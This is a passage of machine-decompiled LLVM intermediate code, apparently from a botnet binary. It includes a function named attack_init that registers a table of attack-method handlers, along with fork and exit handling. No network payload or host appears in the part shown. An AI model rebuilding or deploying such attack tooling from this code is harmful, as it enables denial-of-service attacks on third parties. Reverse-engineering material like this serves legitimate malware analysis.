  %v2_100005b0 = inttoptr i32 %v0_100005a8 to i32*
  store i32 0, i32* %v2_100005b0, align 4
  store i32 268436920, i32* @lr, align 4
  %v0_100005b4 = call i32 @__libc_fork()
  store i32 %v0_100005b4, i32* %r3.global-to-local, align 4
  %tmp33 = icmp slt i32 %v0_100005b4, 1
  br i1 %tmp33, label %dec_label_pc_1000064c, label %dec_label_pc_100005c0

dec_label_pc_100005c0:                            ; preds = %dec_label_pc_10000560, %dec_label_pc_1000054c, %dec_label_pc_10000540, %dec_label_pc_1000064c, %dec_label_pc_100005a8, %dec_label_pc_10000514, %dec_label_pc_10000500, %dec_label_pc_100004e8, %dec_label_pc_100004cc
  %v0_100005c0 = load i32, i32* %r20.global-to-local, align 4
  %v3_100005c0 = icmp eq i32 %v0_100005c0, 0
  br i1 %v3_100005c0, label %dec_label_pc_100005d0, label %dec_label_pc_100005c8

dec_label_pc_100005c8:                            ; preds = %dec_label_pc_100005c0
  store i32 %v0_100005c0, i32* @r3, align 4
  store i32 268436944, i32* @lr, align 4
  %v0_100005cc = call i32 @free()
  store i32 %v0_100005cc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100005d0

dec_label_pc_100005d0:                            ; preds = %dec_label_pc_100005c0, %dec_label_pc_100005c8
  %v0_100005d0 = load i32, i32* @r29, align 4
  %v3_100005d0 = icmp eq i32 %v0_100005d0, 0
  br i1 %v3_100005d0, label %dec_label_pc_100005d0.dec_label_pc_10000400_crit_edge, label %dec_label_pc_100005d8

dec_label_pc_100005d0.dec_label_pc_10000400_crit_edge: ; preds = %dec_label_pc_100005d0
  %v0_1000043c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10000400

dec_label_pc_100005d8:                            ; preds = %dec_label_pc_100005d0
  %v0_100005d8 = load i32, i32* @r30, align 4
  %v3_100005d8 = icmp eq i32 %v0_100005d8, 0
  br i1 %v3_100005d8, label %dec_label_pc_10000604, label %dec_label_pc_100005e0

dec_label_pc_100005e0:                            ; preds = %dec_label_pc_100005d8
  br label %dec_label_pc_100005e4

dec_label_pc_100005e4:                            ; preds = %dec_label_pc_100005f8, %dec_label_pc_100005e0
  %v0_100005fc12 = phi i32 [ %v0_100005d8, %dec_label_pc_100005e0 ], [ %v0_100005fc, %dec_label_pc_100005f8 ]
  %v0_100005e8 = phi i32 [ %v0_100005d0, %dec_label_pc_100005e0 ], [ %v0_10000604.pre, %dec_label_pc_100005f8 ]
  %v0_100005e4 = phi i32 [ 0, %dec_label_pc_100005e0 ], [ %v1_100005f8, %dec_label_pc_100005f8 ]
  %v1_100005e4 = mul i32 %v0_100005e4, 8
  store i32 %v1_100005e4, i32* %r0.global-to-local, align 4
  %v2_100005e8 = add i32 %v1_100005e4, %v0_100005e8
  %v3_100005e8 = inttoptr i32 %v2_100005e8 to i32*
  %v4_100005e8 = load i32, i32* %v3_100005e8, align 4
  store i32 %v4_100005e8, i32* @r3, align 4
  %v3_100005ec = icmp eq i32 %v4_100005e8, 0
  br i1 %v3_100005ec, label %dec_label_pc_100005f8, label %dec_label_pc_100005f4

dec_label_pc_100005f4:                            ; preds = %dec_label_pc_100005e4
  store i32 268436984, i32* @lr, align 4
  %v0_100005f4 = call i32 @free()
  store i32 %v0_100005f4, i32* %r3.global-to-local, align 4
  %v0_100005f8.pre = load i32, i32* @r31, align 4
  %v0_100005fc.pre = load i32, i32* @r30, align 4
  %v0_10000604.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100005f8

dec_label_pc_100005f8:                            ; preds = %dec_label_pc_100005e4, %dec_label_pc_100005f4
  %v0_10000604.pre = phi i32 [ %v0_100005e8, %dec_label_pc_100005e4 ], [ %v0_10000604.pre.pre, %dec_label_pc_100005f4 ]
  %v0_100005fc = phi i32 [ %v0_100005fc12, %dec_label_pc_100005e4 ], [ %v0_100005fc.pre, %dec_label_pc_100005f4 ]
  %v0_100005f8 = phi i32 [ %v0_100005e4, %dec_label_pc_100005e4 ], [ %v0_100005f8.pre, %dec_label_pc_100005f4 ]
  %v1_100005f8 = add i32 %v0_100005f8, 1
  %v4_100005fc = icmp eq i32 %v0_100005fc, %v1_100005f8
  br i1 %v4_100005fc, label %dec_label_pc_10000604, label %dec_label_pc_100005e4

dec_label_pc_10000604:                            ; preds = %dec_label_pc_100005f8, %dec_label_pc_100005d8
  %v0_10000604 = phi i32 [ %v0_100005d0, %dec_label_pc_100005d8 ], [ %v0_10000604.pre, %dec_label_pc_100005f8 ]
  store i32 %v0_10000604, i32* @r3, align 4
  store i32 268437004, i32* @lr, align 4
  %v0_10000608 = call i32 @free()
  store i32 %v0_10000608, i32* %r3.global-to-local, align 4
  store i32 %v0_100003b0, i32* %r0.global-to-local, align 4
  store i32 %v0_100003c0, i32* @r21, align 4
  store i32 %v0_100003c4, i32* @r22, align 4
  store i32 %v0_100003c8, i32* @r23, align 4
  store i32 %v0_100003cc, i32* @r24, align 4
  store i32 %v0_100003d0, i32* @r25, align 4
  store i32 %v0_100003dc, i32* @r28, align 4
  store i32 %v0_100003e0, i32* @r29, align 4
  store i32 %v0_100003e4, i32* @r30, align 4
  ret i32 %v0_10000608

dec_label_pc_1000064c:                            ; preds = %dec_label_pc_100005a8
  %v3_1000064c = icmp eq i32 %v0_100005b4, -1
  br i1 %v3_1000064c, label %dec_label_pc_100005c0, label %dec_label_pc_10000654

dec_label_pc_10000654:                            ; preds = %dec_label_pc_1000064c
  %v3_10000658 = load i8, i8* @global_var_100211d8.12, align 1
  %v4_10000658 = zext i8 %v3_10000658 to i32
  store i32 %v4_10000658, i32* %r0.global-to-local, align 4
  %v3_1000065c = icmp eq i8 %v3_10000658, 0
  br i1 %v3_1000065c, label %dec_label_pc_100006c0, label %dec_label_pc_10000664

dec_label_pc_10000664:                            ; preds = %dec_label_pc_10000654
  store i32 %v4_10000658, i32* %ctr.global-to-local, align 4
  %v3_1000066c = load i32, i32* @global_var_100211dc.13, align 4
  store i32 %v3_1000066c, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_10000674 = inttoptr i32 %v3_1000066c to i32*
  %v2_10000674 = load i32, i32* %v1_10000674, align 4
  %v1_10000678 = add i32 %v2_10000674, 4
  %v2_10000678 = inttoptr i32 %v1_10000678 to i8*
  %v3_10000678 = load i8, i8* %v2_10000678, align 1
  %v4_10000678 = zext i8 %v3_10000678 to i32
  store i32 %v4_10000678, i32* %r0.global-to-local, align 4
  %v1_1000067c = load i32, i32* @r21, align 4
  %v4_1000067c = icmp eq i32 %v4_10000678, %v1_1000067c
  br i1 %v4_1000067c, label %dec_label_pc_100006a0, label %dec_label_pc_10000684

dec_label_pc_10000684:                            ; preds = %dec_label_pc_10000664, %dec_label_pc_1000068c
  %v0_10000688 = phi i32 [ %v1_10000688, %dec_label_pc_1000068c ], [ %v4_10000658, %dec_label_pc_10000664 ]
  %v0_10000684 = phi i32 [ %v1_10000684, %dec_label_pc_1000068c ], [ 0, %dec_label_pc_10000664 ]
  %v1_10000684 = add i32 %v0_10000684, 1
  store i32 %v1_10000684, i32* %r11.global-to-local, align 4
  %v1_10000688 = add i32 %v0_10000688, -1
  store i32 %v1_10000688, i32* %ctr.global-to-local, align 4
  %v2_10000688 = icmp eq i32 %v1_10000688, 0
  br i1 %v2_10000688, label %dec_label_pc_100006c0, label %dec_label_pc_1000068c

dec_label_pc_1000068c:                            ; preds = %dec_label_pc_10000684
  %v1_1000068c = mul i32 %v1_10000684, 4
  %v2_10000690 = add i32 %v1_1000068c, %v3_1000066c
  %v3_10000690 = inttoptr i32 %v2_10000690 to i32*
  %v4_10000690 = load i32, i32* %v3_10000690, align 4
  %v1_10000694 = add i32 %v4_10000690, 4
  %v2_10000694 = inttoptr i32 %v1_10000694 to i8*
  %v3_10000694 = load i8, i8* %v2_10000694, align 1
  %v4_10000694 = zext i8 %v3_10000694 to i32
  store i32 %v4_10000694, i32* %r0.global-to-local, align 4
  %v4_10000698 = icmp eq i32 %v4_10000694, %v1_1000067c
  br i1 %v4_10000698, label %dec_label_pc_100006a0, label %dec_label_pc_10000684

dec_label_pc_100006a0:                            ; preds = %dec_label_pc_1000068c, %dec_label_pc_10000664
  %v0_100006a0 = phi i32 [ %v2_10000674, %dec_label_pc_10000664 ], [ %v4_10000690, %dec_label_pc_1000068c ]
  %v1_100006a0 = inttoptr i32 %v0_100006a0 to i32*
  %v2_100006a0 = load i32, i32* %v1_100006a0, align 4
  %v0_100006a4 = load i32, i32* @r23, align 4
  store i32 %v0_100006a4, i32* %r3.global-to-local, align 4
  store i32 %v2_100006a0, i32* %ctr.global-to-local, align 4
  call void @__pseudo_call(i32 %v2_100006a0)
  br label %dec_label_pc_100006c0

dec_label_pc_100006c0:                            ; preds = %dec_label_pc_10000684, %dec_label_pc_10000654, %dec_label_pc_100006a0
  %v0_100006c4 = call i32 @__GI_exit()
  store i32 %v0_100006c4, i32* %r3.global-to-local, align 4
  ret i32 %v0_100006c4

; uselistorder directives
  uselistorder i32 %v2_100006a0, { 1, 0 }
  uselistorder i32 %v1_10000688, { 2, 1, 0 }
  uselistorder i32 %v1_10000684, { 0, 2, 1 }
  uselistorder i32 %v1_100005f8, { 1, 0 }
  uselistorder i32 %v0_100005fc, { 1, 0 }
  uselistorder i32 %v1_100005e4, { 1, 0 }
  uselistorder i32 %v0_100005e4, { 1, 0 }
  uselistorder i32 %v4_10000564, { 1, 0 }
  uselistorder i32 %v1_1000055c, { 1, 0 }
  uselistorder i32 %v5_100004d8, { 1, 0, 2 }
  uselistorder i32 %v1_100004c8, { 1, 0 }
  uselistorder i32 %v1_100004c4, { 1, 0 }
  uselistorder i32 %v4_1000044c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_100003b8, { 5, 6, 0, 1, 2, 3, 4, 7 }
  uselistorder i32 %v0_100003b0, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 20, 6, 7, 8, 12, 13, 14, 9, 10, 11, 15, 16, 17, 18, 19, 21, 22, 23, 0, 1 }
  uselistorder i32 %arg2, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_100006c0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10000684, { 1, 0 }
  uselistorder label %dec_label_pc_100005f8, { 1, 0 }
  uselistorder label %dec_label_pc_100005d0, { 1, 0 }
  uselistorder label %dec_label_pc_100005c0, { 3, 4, 0, 1, 2, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_10000580, { 1, 0 }
  uselistorder label %dec_label_pc_10000400, { 0, 2, 3, 4, 1, 5 }
}

define i32 @attack_init(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v0_100006cc = load i32, i32* @lr, align 4
  store i32 %v0_100006cc, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r4.global-to-local, align 4
  %v0_100006e8 = load i32, i32* @r28, align 4
  store i32 268437236, i32* @lr, align 4
  %v2_100006f0 = call i32 @calloc(i32 1, i32 8)
  store i32 %v2_100006f0, i32* @r28, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_10000708 = load i32, i32* @global_var_100211dc.13, align 4
  %v2_1000070c = inttoptr i32 %v2_100006f0 to i32*
  store i32 268453924, i32* %v2_1000070c, align 4
  store i32 ptrtoint (i8* @global_var_100211d9.15 to i32), i32* %r4.global-to-local, align 4
  %v0_10000714 = load i32, i32* %r0.global-to-local, align 4
  %v1_10000714 = trunc i32 %v0_10000714 to i8
  %v2_10000714 = load i32, i32* @r28, align 4
  %v3_10000714 = add i32 %v2_10000714, 4
  %v4_10000714 = inttoptr i32 %v3_10000714 to i8*
  store i8 %v1_10000714, i8* %v4_10000714, align 1
  %v0_10000718 = load i32, i32* %r4.global-to-local, align 4
  %v1_10000718 = mul i32 %v0_10000718, 4
  store i32 %v1_10000718, i32* %r4.global-to-local, align 4
  store i32 268437280, i32* @lr, align 4
  %v2_1000071c = inttoptr i32 %v3_10000708 to i32*
  %v3_1000071c = call i32 @realloc(i32* %v2_1000071c, i32 %v1_10000718)
  %v3_10000720 = load i8, i8* @global_var_100211d8.12, align 1
  %v4_10000720 = zext i8 %v3_10000720 to i32
  store i32 %v3_1000071c, i32* %r10.global-to-local, align 4
  store i32 8, i32* %r4.global-to-local, align 4
  %v1_1000072c = mul nuw nsw i32 %v4_10000720, 4
  store i32 ptrtoint (i8* @global_var_100211d9.15 to i32), i32* %r11.global-to-local, align 4
  %v0_10000734 = load i32, i32* @r28, align 4
  %v3_10000734 = add i32 %v1_1000072c, %v3_1000071c
  %v4_10000734 = inttoptr i32 %v3_10000734 to i32*
  store i32 %v0_10000734, i32* %v4_10000734, align 4
  %v0_1000073c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000073c = trunc i32 %v0_1000073c to i8
  store i8 %v1_1000073c, i8* @global_var_100211d8.12, align 1
  %v0_10000740 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_10000740, i32* @global_var_100211dc.13, align 4
  store i32 268437320, i32* @lr, align 4
  %v2_10000744 = call i32 @calloc(i32 1, i32 8)
  store i32 %v2_10000744, i32* @r28, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_1000075c = load i32, i32* @global_var_100211dc.13, align 4
  %v2_10000760 = inttoptr i32 %v2_10000744 to i32*
  store i32 268455248, i32* %v2_10000760, align 4
  store i32 ptrtoint (i8* @global_var_100211d9.15 to i32), i32* %r4.global-to-local, align 4
  %v0_10000768 = load i32, i32* %r0.global-to-local, align 4
  %v1_10000768 = trunc i32 %v0_10000768 to i8
  %v2_10000768 = load i32, i32* @r28, align 4
  %v3_10000768 = add i32 %v2_10000768, 4
  %v4_10000768 = inttoptr i32 %v3_10000768 to i8*
  store i8 %v1_10000768, i8* %v4_10000768, align 1
  %v0_1000076c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000076c = mul i32 %v0_1000076c, 4
  store i32 %v1_1000076c, i32* %r4.global-to-local, align 4
  store i32 268437364, i32* @lr, align 4
  %v2_10000770 = inttoptr i32 %v3_1000075c to i32*
  %v3_10000770 = call i32 @realloc(i32* %v2_10000770, i32 %v1_1000076c)
  %v3_10000774 = load i8, i8* @global_var_100211d8.12, align 1
  %v4_10000774 = zext i8 %v3_10000774 to i32
  store i32 %v3_10000770, i32* %r10.global-to-local, align 4
  store i32 8, i32* %r4.global-to-local, align 4
  %v1_10000780 = mul nuw nsw i32 %v4_10000774, 4
  store i32 ptrtoint (i8* @global_var_100211d9.15 to i32), i32* %r11.global-to-local, align 4
  %v0_10000788 = load i32, i32* @r28, align 4
  %v3_10000788 = add i32 %v1_10000780, %v3_10000770
  %v4_10000788 = inttoptr i32 %v3_10000788 to i32*
  store i32 %v0_10000788, i32* %v4_10000788, align 4
  %v0_10000790 = load i32, i32* %r11.global-to-local, align 4
  %v1_10000790 = trunc i32 %v0_10000790 to i8
  store i8 %v1_10000790, i8* @global_var_100211d8.12, align 1
  %v0_10000794 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_10000794, i32* @global_var_100211dc.13, align 4
  store i32 268437404, i32* @lr, align 4
  %v2_10000798 = call i32 @calloc(i32 1, i32 8)
  store i32 %v2_10000798, i32* @r28, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_100007b0 = load i32, i32* @global_var_100211dc.13, align 4
  %v2_100007b4 = inttoptr i32 %v2_10000798 to i32*
  store i32 268456288, i32* %v2_100007b4, align 4
  store i32 ptrtoint (i8* @global_var_100211d9.15 to i32), i32* %r4.global-to-local, align 4
  %v0_100007bc = load i32, i32* %r0.global-to-local, align 4
  %v1_100007bc = trunc i32 %v0_100007bc to i8
  %v2_100007bc = load i32, i32* @r28, align 4
  %v3_100007bc = add i32 %v2_100007bc, 4
  %v4_100007bc = inttoptr i32 %v3_100007bc to i8*
  store i8 %v1_100007bc, i8* %v4_100007bc, align 1
  %v0_100007c0 = load i32, i32* %r4.global-to-local, align 4
  %v1_100007c0 = mul i32 %v0_100007c0, 4
  store i32 %v1_100007c0, i32* %r4.global-to-local, align 4
  store i32 268437448, i32* @lr, align 4
  %v2_100007c4 = inttoptr i32 %v3_100007b0 to i32*
  %v3_100007c4 = call i32 @realloc(i32* %v2_100007c4, i32 %v1_100007c0)
  %v3_100007c8 = load i8, i8* @global_var_100211d8.12, align 1
  %v4_100007c8 = zext i8 %v3_100007c8 to i32
  store i32 %v3_100007c4, i32* %r10.global-to-local, align 4
  store i32 8, i32* %r4.global-to-local, align 4
  %v1_100007d4 = mul nuw nsw i32 %v4_100007c8, 4
  store i32 ptrtoint (i8* @global_var_100211d9.15 to i32), i32* %r11.global-to-local, align 4
  %v0_100007dc = load i32, i32* @r28, align 4
  %v3_100007dc = add i32 %v1_100007d4, %v3_100007c4
  %v4_100007dc = inttoptr i32 %v3_100007dc to i32*
  store i32 %v0_100007dc, i32* %v4_100007dc, align 4
  %v0_100007e4 = load i32, i32* %r11.global-to-local, align 4
  %v1_100007e4 = trunc i32 %v0_100007e4 to i8
  store i8 %v1_100007e4, i8* @global_var_100211d8.12, align 1
  %v0_100007e8 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_100007e8, i32* @global_var_100211dc.13, align 4
  store i32 268437488, i32* @lr, align 4
  %v2_100007ec = call i32 @calloc(i32 1, i32 8)
  store i32 %v2_100007ec, i32* @r28, align 4
  store i32 8, i32* %r0.global-to-local, align 4
  %v3_10000804 = load i32, i32* @global_var_100211dc.13, align 4
  %v2_10000808 = inttoptr i32 %v2_100007ec to i32*
  store i32 268453184, i32* %v2_10000808, align 4
  store i32 ptrtoint (i8* @global_var_100211d9.15 to i32), i32* %r4.global-to-local, align 4
  %v0_10000810 = load i32, i32* %r0.global-to-local, align 4
  %v1_10000810 = trunc i32 %v0_10000810 to i8
  %v2_10000810 = load i32, i32* @r28, align 4
  %v3_10000810 = add i32 %v2_10000810, 4
  %v4_10000810 = inttoptr i32 %v3_10000810 to i8*
  store i8 %v1_10000810, i8* %v4_10000810, align 1
  %v0_10000814 = load i32, i32* %r4.global-to-local, align 4
  %v1_10000814 = mul i32 %v0_10000814, 4
  store i32 %v1_10000814, i32* %r4.global-to-local, align 4
  store i32 268437532, i32* @lr, align 4
  %v2_10000818 = inttoptr i32 %v3_10000804 to i32*
  %v3_10000818 = call i32 @realloc(i32* %v2_10000818, i32 %v1_10000814)
  %v3_1000081c = load i8, i8* @global_var_100211d8.12, align 1
  %v4_1000081c = zext i8 %v3_1000081c to i32
  store i32 %v3_10000818, i32* %r10.global-to-local, align 4
  store i32 8, i32* %r4.global-to-local, align 4
  %v1_10000828 = mul nuw nsw i32 %v4_1000081c, 4
  store i32 ptrtoint (i8* @global_var_100211d9.15 to i32), i32* %r11.global-to-local, align 4
  %v0_10000830 = load i32, i32* @r28, align 4
  %v3_10000830 = add i32 %v1_10000828, %v3_10000818
  %v4_10000830 = inttoptr i32 %v3_10000830 to i32*
  store i32 %v0_10000830, i32* %v4_10000830, align 4
  %v0_10000838 = load i32, i32* %r11.global-to-local, align 4
  %v1_10000838 = trunc i32 %v0_10000838 to i8
  store i8 %v1_10000838, i8* @global_var_100211d8.12, align 1
  %v0_1000083c = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_1000083c, i32* @global_var_100211dc.13, align 4
  store i32 268437572, i32* @lr, align 4
  %v2_10000840 = call i32 @calloc(i32 1, i32 8)
  store i32 %v2_10000840, i32* @r28, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  %v3_10000858 = load i32, i32* @global_var_100211dc.13, align 4
  %v2_1000085c = inttoptr i32 %v2_10000840 to i32*
  store i32 268451560, i32* %v2_1000085c, align 4
  store i32 ptrtoint (i8* @global_var_100211d9.15 to i32), i32* %r4.global-to-local, align 4
  %v0_10000864 = load i32, i32* %r0.global-to-local, align 4
  %v1_10000864 = trunc i32 %v0_10000864 to i8
  %v2_10000864 = load i32, i32* @r28, align 4
  %v3_10000864 = add i32 %v2_10000864, 4
  %v4_10000864 = inttoptr i32 %v3_10000864 to i8*
  store i8 %v1_10000864, i8* %v4_10000864, align 1
  %v0_10000868 = load i32, i32* %r4.global-to-local, align 4
  %v1_10000868 = mul i32 %v0_10000868, 4
  store i32 %v1_10000868, i32* %r4.global-to-local, align 4
  store i32 268437616, i32* @lr, align 4
  %v2_1000086c = inttoptr i32 %v3_10000858 to i32*
  %v3_1000086c = call i32 @realloc(i32* %v2_1000086c, i32 %v1_10000868)
  %v3_10000870 = load i8, i8* @global_var_100211d8.12, align 1
  %v4_10000870 = zext i8 %v3_10000870 to i32
  store i32 %v3_1000086c, i32* %r10.global-to-local, align 4
  store i32 8, i32* %r4.global-to-local, align 4
  %v1_1000087c = mul nuw nsw i32 %v4_10000870, 4
  store i32 ptrtoint (i8* @global_var_100211d9.15 to i32), i32* %r11.global-to-local, align 4
  %v0_10000884 = load i32, i32* @r28, align 4
  %v3_10000884 = add i32 %v1_1000087c, %v3_1000086c
  %v4_10000884 = inttoptr i32 %v3_10000884 to i32*
  store i32 %v0_10000884, i32* %v4_10000884, align 4
  %v0_1000088c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000088c = trunc i32 %v0_1000088c to i8
  store i8 %v1_1000088c, i8* @global_var_100211d8.12, align 1
  %v0_10000890 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_10000890, i32* @global_var_100211dc.13, align 4
  store i32 268437656, i32* @lr, align 4
  %v2_10000894 = call i32 @calloc(i32 1, i32 8)
  store i32 %v2_10000894, i32* @r28, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v3_100008ac = load i32, i32* @global_var_100211dc.13, align 4
  %v2_100008b0 = inttoptr i32 %v2_10000894 to i32*
  store i32 268449892, i32* %v2_100008b0, align 4
  store i32 ptrtoint (i8* @global_var_100211d9.15 to i32), i32* %r4.global-to-local, align 4
  %v0_100008b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100008b8 = trunc i32 %v0_100008b8 to i8
  %v2_100008b8 = load i32, i32* @r28, align 4
  %v3_100008b8 = add i32 %v2_100008b8, 4
  %v4_100008b8 = inttoptr i32 %v3_100008b8 to i8*
  store i8 %v1_100008b8, i8* %v4_100008b8, align 1
  %v0_100008bc = load i32, i32* %r4.global-to-local, align 4
  %v1_100008bc = mul i32 %v0_100008bc, 4
  store i32 %v1_100008bc, i32* %r4.global-to-local, align 4
  store i32 268437700, i32* @lr, align 4
  %v2_100008c0 = inttoptr i32 %v3_100008ac to i32*
  %v3_100008c0 = call i32 @realloc(i32* %v2_100008c0, i32 %v1_100008bc)
  %v3_100008c4 = load i8, i8* @global_var_100211d8.12, align 1
  %v4_100008c4 = zext i8 %v3_100008c4 to i32
  store i32 %v3_100008c0, i32* %r10.global-to-local, align 4
  store i32 8, i32* %r4.global-to-local, align 4
  %v1_100008d0 = mul nuw nsw i32 %v4_100008c4, 4
  store i32 ptrtoint (i8* @global_var_100211d9.15 to i32), i32* %r11.global-to-local, align 4
  %v0_100008d8 = load i32, i32* @r28, align 4
  %v3_100008d8 = add i32 %v1_100008d0, %v3_100008c0
  %v4_100008d8 = inttoptr i32 %v3_100008d8 to i32*
  store i32 %v0_100008d8, i32* %v4_100008d8, align 4
  %v0_100008e0 = load i32, i32* %r11.global-to-local, align 4
  %v1_100008e0 = trunc i32 %v0_100008e0 to i8
  store i8 %v1_100008e0, i8* @global_var_100211d8.12, align 1
  %v0_100008e4 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_100008e4, i32* @global_var_100211dc.13, align 4
  store i32 268437740, i32* @lr, align 4
  %v2_100008e8 = call i32 @calloc(i32 1, i32 8)
  store i32 %v2_100008e8, i32* @r28, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  %v3_10000900 = load i32, i32* @global_var_100211dc.13, align 4
  %v2_10000904 = inttoptr i32 %v2_100008e8 to i32*
  store i32 268448136, i32* %v2_10000904, align 4
  store i32 ptrtoint (i8* @global_var_100211d9.15 to i32), i32* %r4.global-to-local, align 4
  %v0_1000090c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000090c = trunc i32 %v0_1000090c to i8
  %v2_1000090c = load i32, i32* @r28, align 4
  %v3_1000090c = add i32 %v2_1000090c, 4
  %v4_1000090c = inttoptr i32 %v3_1000090c to i8*
  store i8 %v1_1000090c, i8* %v4_1000090c, align 1
  %v0_10000910 = load i32, i32* %r4.global-to-local, align 4
  %v1_10000910 = mul i32 %v0_10000910, 4
  store i32 %v1_10000910, i32* %r4.global-to-local, align 4
  store i32 268437784, i32* @lr, align 4
  %v2_10000914 = inttoptr i32 %v3_10000900 to i32*
  %v3_10000914 = call i32 @realloc(i32* %v2_10000914, i32 %v1_10000910)
  %v3_10000918 = load i8, i8* @global_var_100211d8.12, align 1
  %v4_10000918 = zext i8 %v3_10000918 to i32
  store i32 %v3_10000914, i32* %r10.global-to-local, align 4
  store i32 8, i32* %r4.global-to-local, align 4
  %v1_10000924 = mul nuw nsw i32 %v4_10000918, 4
  store i32 ptrtoint (i8* @global_var_100211d9.15 to i32), i32* %r11.global-to-local, align 4
  %v0_1000092c = load i32, i32* @r28, align 4
  %v3_1000092c = add i32 %v1_10000924, %v3_10000914
  %v4_1000092c = inttoptr i32 %v3_1000092c to i32*
  store i32 %v0_1000092c, i32* %v4_1000092c, align 4
  %v0_10000934 = load i32, i32* %r11.global-to-local, align 4
  %v1_10000934 = trunc i32 %v0_10000934 to i8
  store i8 %v1_10000934, i8* @global_var_100211d8.12, align 1
  %v0_10000938 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_10000938, i32* @global_var_100211dc.13, align 4
  store i32 268437824, i32* @lr, align 4
  %v2_1000093c = call i32 @calloc(i32 1, i32 8)
  store i32 %v2_1000093c, i32* @r28, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v3_10000954 = load i32, i32* @global_var_100211dc.13, align 4
  %v2_10000958 = inttoptr i32 %v2_1000093c to i32*
  store i32 268446612, i32* %v2_10000958, align 4
  store i32 ptrtoint (i8* @global_var_100211d9.15 to i32), i32* %r4.global-to-local, align 4
  %v0_10000960 = load i32, i32* %r0.global-to-local, align 4
  %v1_10000960 = trunc i32 %v0_10000960 to i8
  %v2_10000960 = load i32, i32* @r28, align 4
  %v3_10000960 = add i32 %v2_10000960, 4
  %v4_10000960 = inttoptr i32 %v3_10000960 to i8*
  store i8 %v1_10000960, i8* %v4_10000960, align 1
  %v0_10000964 = load i32, i32* %r4.global-to-local, align 4
  %v1_10000964 = mul i32 %v0_10000964, 4
  store i32 %v1_10000964, i32* %r4.global-to-local, align 4
  store i32 268437868, i32* @lr, align 4
  %v2_10000968 = inttoptr i32 %v3_10000954 to i32*
  %v3_10000968 = call i32 @realloc(i32* %v2_10000968, i32 %v1_10000964)
  %v3_1000096c = load i8, i8* @global_var_100211d8.12, align 1
  %v4_1000096c = zext i8 %v3_1000096c to i32
  store i32 %v3_10000968, i32* %r10.global-to-local, align 4
  store i32 8, i32* %r4.global-to-local, align 4
  %v1_10000978 = mul nuw nsw i32 %v4_1000096c, 4
  store i32 ptrtoint (i8* @global_var_100211d9.15 to i32), i32* %r11.global-to-local, align 4
  %v0_10000980 = load i32, i32* @r28, align 4
  %v3_10000980 = add i32 %v1_10000978, %v3_10000968
  %v4_10000980 = inttoptr i32 %v3_10000980 to i32*
  store i32 %v0_10000980, i32* %v4_10000980, align 4
  %v0_10000988 = load i32, i32* %r11.global-to-local, align 4
  %v1_10000988 = trunc i32 %v0_10000988 to i8
  store i8 %v1_10000988, i8* @global_var_100211d8.12, align 1
  %v0_1000098c = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_1000098c, i32* @global_var_100211dc.13, align 4
  store i32 268437908, i32* @lr, align 4
  %v2_10000990 = call i32 @calloc(i32 1, i32 8)
  store i32 %v2_10000990, i32* @r28, align 4
  store i32 7, i32* %r0.global-to-local, align 4
  %v3_100009a8 = load i32, i32* @global_var_100211dc.13, align 4
  %v2_100009ac = inttoptr i32 %v2_10000990 to i32*
  store i32 268444984, i32* %v2_100009ac, align 4
  store i32 ptrtoint (i8* @global_var_100211d9.15 to i32), i32* %r4.global-to-local, align 4
  %v0_100009b4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100009b4 = trunc i32 %v0_100009b4 to i8
  %v2_100009b4 = load i32, i32* @r28, align 4
  %v3_100009b4 = add i32 %v2_100009b4, 4
  %v4_100009b4 = inttoptr i32 %v3_100009b4 to i8*
  store i8 %v1_100009b4, i8* %v4_100009b4, align 1
  %v0_100009b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_100009b8 = mul i32 %v0_100009b8, 4
  store i32 %v1_100009b8, i32* %r4.global-to-local, align 4
  store i32 268437952, i32* @lr, align 4
  %v2_100009bc = inttoptr i32 %v3_100009a8 to i32*
  %v3_100009bc = call i32 @realloc(i32* %v2_100009bc, i32 %v1_100009b8)
  %v3_100009c0 = load i8, i8* @global_var_100211d8.12, align 1
  %v4_100009c0 = zext i8 %v3_100009c0 to i32
  store i32 %v3_100009bc, i32* %r10.global-to-local, align 4
  store i32 8, i32* %r4.global-to-local, align 4
  %v1_100009cc = mul nuw nsw i32 %v4_100009c0, 4
  store i32 ptrtoint (i8* @global_var_100211d9.15 to i32), i32* %r11.global-to-local, align 4
  %v0_100009d4 = load i32, i32* @r28, align 4
  %v3_100009d4 = add i32 %v1_100009cc, %v3_100009bc
  %v4_100009d4 = inttoptr i32 %v3_100009d4 to i32*
  store i32 %v0_100009d4, i32* %v4_100009d4, align 4
  %v0_100009dc = load i32, i32* %r11.global-to-local, align 4
  %v1_100009dc = trunc i32 %v0_100009dc to i8
